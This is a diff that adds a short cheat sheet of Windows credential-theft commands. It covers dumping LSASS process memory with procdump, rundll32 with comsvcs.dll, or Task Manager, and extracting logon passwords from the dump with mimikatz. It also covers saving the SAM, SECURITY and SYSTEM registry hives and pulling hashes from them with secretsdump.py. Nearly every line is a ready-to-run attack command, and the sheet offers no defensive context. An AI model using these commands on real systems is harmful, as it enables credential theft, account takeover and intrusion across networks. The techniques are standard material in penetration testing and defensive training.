@@ -1,0 +1,24 @@
+[Procdump from sysinternals]
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+[Executing a native comsvcs.dll DLL found in Windows\system32 with rundll32]
+.\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full
+
+[Task manager (running as admin)] 
+Click on lsass.exe and select “Create Dump File”
+
+
+[Extract from dump using mimikatz]
+mimikatz # sekurlsa::minidump C:\Users\sandbox\Desktop\lsass.dmp
+mimikatz # sekurlsa::logonpasswords
+
+
+[Registry Hives]
+
+Get a copy of the SYSTEM, SECURITY and SAM hives and download them back to your local system:
+
+C:\> reg.exe save hklm\sam c:\temp\sam.save
+C:\> reg.exe save hklm\security c:\temp\security.save
+C:\> reg.exe save hklm\system c:\temp\system.save
+
+secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
